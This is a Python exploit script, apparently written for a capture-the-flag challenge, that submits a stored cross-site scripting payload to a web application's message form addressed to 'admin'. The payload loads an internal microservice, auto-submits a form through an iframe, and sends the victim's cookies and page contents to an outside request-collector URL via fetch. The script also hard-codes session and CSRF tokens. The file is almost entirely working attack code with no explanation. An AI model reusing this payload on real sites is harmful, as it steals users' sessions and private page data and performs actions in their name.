import requests

cookies = {
    'csrftoken': 'NM0XmFBeAeadStPA06VdTgNHgExhwVWk',
    'sessionid': '95c8km0fccrdpeyrsyqc4kid3zss1hdy',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'csrftoken=NM0XmFBeAeadStPA06VdTgNHgExhwVWk; sessionid=95c8km0fccrdpeyrsyqc4kid3zss1hdy',
    'DNT': '1',
    'Origin': 'https://web.kazet.cc:42448',
    'Referer': 'https://web.kazet.cc:42448/create',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
}

data = {
    'csrfmiddlewaretoken': 'jJdmmka6Exc1626LSmypYGlyuuDNx26cWl39yPBa4Bc4OlLbIijsHMY5AY0UTNSm',
    'recipient': 'admin',
    'content': '''  <div class="footer"></div>
    pppp <p>pppp</p></p>
    <object type="text/html" style="width: 100%;" data="http://zad41-mimuw-finals-2023-super-secret-microservice"></object>
    <iframe id="iframe" src="https://web.kazet.cc:42448/create"></iframe>
    <script>
        function sendCookiesToServer() {
            const iframe = document.getElementById("iframe");
            
    
            iframe.onload = function () {
                var ifr = iframe.contentDocument;
                ifr.querySelectorAll("form")[0]["recipient"].value = "admin6"; ifr.querySelectorAll("form")[0]["content"].value = "admin5"; ifr.querySelectorAll("form")[0].submit();

                const iframeSourceCode = iframe.contentDocument.body.innerHTML
                const cookies = document.cookie;
                const pageSourceCode = document.documentElement.innerHTML;
    
                const url = "https://enu1ocvw8oopf.x.pipedream.net/";
    
                fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        cookies,
                        iframeSourceCode,
                        pageSourceCode,
                    }),
                });
            };
        }
    
        document.addEventListener("DOMContentLoaded", sendCookiesToServer);
    </script>
    ''',
    'template': 'normal',
}

response = requests.post('https://web.kazet.cc:42448/create', cookies=cookies, headers=headers, data=data)
